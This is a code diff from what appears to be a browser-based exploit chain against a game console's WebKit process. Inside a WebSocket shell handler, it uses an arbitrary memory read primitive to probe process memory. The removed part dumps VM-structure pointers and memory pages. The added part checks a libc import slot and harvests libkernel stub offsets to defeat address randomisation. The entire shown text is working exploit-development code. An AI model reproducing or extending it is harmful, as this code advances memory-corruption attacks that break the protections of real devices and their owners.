@@ -5570,47 +5570,33 @@ function _startWsShell(){
           reply.lk='0x'+lk.toString(16);
           reply.entry='0x'+entry.toString(16);
           reply.atbase='0x'+atbase.toString(16);
-          /* (3) THE VM CENSUS: the VM structure's foreign fields point
-           * at loader/module-database structures (the 0x10-spaced
-           * 0x80b-class slot arrays observed at VM+0x270..0x2A8 in
-           * prior boots - live values the engine dereferences).
-           * Dump [VM, VM+0x800) (proven readable), collect foreign
-           * module-class values, group by 16KB page, then dump the
-           * TOP cluster's page (beaconed first - a death banks which
-           * page killed). */
-          var vmB=S.vm;
-          if(!vmB){reply.err='no vm pointer';break;}
-          var vmw=S.absRead(vmB,0x800);
-          var wBase=S.BASE||0n;
-          var pages={};
-          var pageArr=[];
-          for(var vi=0;vi<vmw.length;vi++){
-            var p2=vmw[vi];
-            if(p2>0x800000000n&&p2<0x1000000000n){
-              /* exclude known classes: libkernel, WebKit span */
-              if(p2>=lk&&p2<lk+0x100000n)continue;
-              if(p2>=wBase&&p2<wBase+0x8000000n)continue;
-              if(p2>=0x880000000n&&p2<0x890000000n)continue;
-              var pg=p2&~0x3FFFn;
-              if(!pages[pg.toString(16)]){pages[pg.toString(16)]=0;pageArr.push(pg);}
-              pages[pg.toString(16)]++;
+          /* (3) THE INTERPRETER TEST: if AT_BASE is libSceLibcInternal,
+           * the KNOWN gettimeofday import slot at libc+0x1179A8 holds
+           * an lk pointer (the game lane's 2-boot-proven offset).
+           * Read [atbase+0x117980, +0x117A00) - beaconed first.
+           * If the slot value lands in [lk, lk+0x100000) -> the
+           * interpreter IS libc -> dump the FULL import window
+           * [libc+0x114000, +0x118000) -> all 96 lk stub offsets. */
+          if(atbase===0n){reply.err='no AT_BASE';break;}
+          var slot=S.absRead(atbase+0x1179A8n,8)[0];
+          LB('3 gt_slot=0x'+slot.toString(16)+' (expect lk+0xB50=0x'+(lk+0xB50n).toString(16)+')');
+          reply.gtSlot='0x'+slot.toString(16);
+          if(slot>=lk&&slot<lk+0x100000n){
+            LB('4 *** INTERPRETER IS LIBC *** slot offset=0x'+(slot-lk).toString(16));
+            reply.interpreterIsLibc=true;
+            reply.libc='0x'+atbase.toString(16);
+            /* the full window: [libc+0x114000, +0x118000) */
+            var win=S.absRead(atbase+0x114000n,0x4000);
+            var stubs=[];
+            for(var wi=0;wi<win.length;wi++){
+              var w=win[wi];
+              if(w>lk&&w<lk+0x100000n){stubs.push('0x'+(w-lk).toString(16));}
             }
-          }
-          /* sort pages by count desc */
-          pageArr.sort(function(a,b){return pages[b.toString(16)]-pages[a.toString(16)];});
-          LB('5 vm foreign pages n='+pageArr.length+' top='+(pageArr.length?pageArr[0].toString(16):'?')+' cnt='+(pageArr.length?pages[pageArr[0].toString(16)]:0));
-          reply.vmPages=pageArr.slice(0,12).map(function(pg){return{page:'0x'+pg.toString(16),count:pages[pg.toString(16)]};});
-          /* (4) dump the top page (the most-referenced foreign page
-           * - the module-database candidate). Beacon BEFORE the read:
-           * a death banks the page identity. */
-          if(pageArr.length>0){
-            var top=pageArr[0];
-            LB('6 READING TOP PAGE 0x'+top.toString(16));
-            var tpg=S.absRead(top,0x1000);
-            var twords=[];
-            for(var ti3=0;ti3<tpg.length;ti3++)twords.push('0x'+tpg[ti3].toString(16));
-            reply.topPage={page:'0x'+top.toString(16),words:twords};
-            LB('7 TOP PAGE READ OK n='+tpg.length);
+            LB('5 WINDOW stubs='+stubs.length);
+            reply.windowStubs=stubs;
+          }else{
+            reply.interpreterIsLibc=false;
+            LB('4 interpreter is NOT libc (slot not in lk range)');
           }
         }catch(e2){reply.err='libc fault: '+String(e2&&e2.message?e2.message:'?');}
         break;
